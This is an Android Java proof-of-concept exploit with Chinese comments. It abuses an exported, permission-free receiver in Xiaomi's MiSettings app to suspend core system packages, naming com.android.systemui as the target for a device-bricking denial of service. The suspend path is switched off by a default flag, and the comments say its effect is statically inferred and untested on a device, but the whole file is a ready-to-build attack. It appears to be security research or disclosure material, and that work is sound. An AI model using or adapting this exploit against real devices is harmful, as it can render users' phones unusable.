// SuspendPoc.java — 普通 app 触发 MisSettings AppTimerReceiver（uid1000）挂起系统核心 app
// 真实攻击场景：普通第三方 app 发送显式广播到 exported 无权限 receiver。
// ⚠ 免责声明: 仅安全研究，勿在未授权/他人/生产设备运行。挂起=静态推断未真机验证。运行前备份数据。
package com.example.misettingspoc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class SuspendPoc extends Activity {
    static final String TAG = "MisSettingsPoc";
    static final String PKG = "com.xiaomi.misettings";
    static final String RECV = "com.xiaomi.misettings.usagestats.AppTimerReceiver";
    // 挂起 action（旧版本处理；新版本 16.4.260726.00 已移除）
    static final String ACTION_SUSPEND = "miui.intent.action.settings.SCHEDULE_PROLONG_LIMIT_TIME";
    // 触发但不挂起的 action（安全，用于验证 receiver 可达）
    static final String ACTION_TRIGGER = "miui.intent.action.settings.SCHEDULE_DEVICE_USAGE_MONITOR";
    // ★ 目标：27 个核心 app 白名单之一（systemui → 黑屏/变砖级 DoS）
    static final String TARGET_PKG = "com.android.systemui";
    // ★ 默认 false：只演示"触发 receiver + 检测"，不实际挂起（挂起=静态推断未真机验证，且不可逆）
    static final boolean DO_SUSPEND = false;

    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent i = new Intent(DO_SUSPEND ? ACTION_SUSPEND : ACTION_TRIGGER);
        i.setComponent(new ComponentName(PKG, RECV));   // 显式广播（Android8+ 隐式受限）
        if (DO_SUSPEND) {
            i.putExtra("pkgName", TARGET_PKG);           // app 可控
        } else {
            i.putExtra("key_modify_notification_text", false);
        }
        sendBroadcast(i);   // exported 无权限 receiver = 任何 uid 可发
        Log.i(TAG, "broadcast sent: " + i + " DO_SUSPEND=" + DO_SUSPEND);
    }
}
